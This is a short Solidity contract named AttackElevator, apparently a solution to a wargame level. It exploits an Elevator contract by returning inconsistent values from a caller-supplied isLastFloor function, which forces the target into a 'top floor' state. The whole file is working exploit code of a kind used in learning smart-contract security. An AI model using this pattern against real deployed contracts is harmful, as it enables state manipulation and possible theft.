pragma solidity ^0.6.0;

import '../Elevator/Elevator.sol';

contract AttackElevator {
 	Elevator public elevator;
	bool public peg;

	constructor(address _elevator) public {
		elevator = Elevator(_elevator);
	}

	function attack() public {
		elevator.goTo(100);
	}

	function isLastFloor(uint _floor) public returns(bool) {
		if(!peg) {
			peg = true;
			return false;
		} else {
			peg = false;
			return true;
		}
	}
}
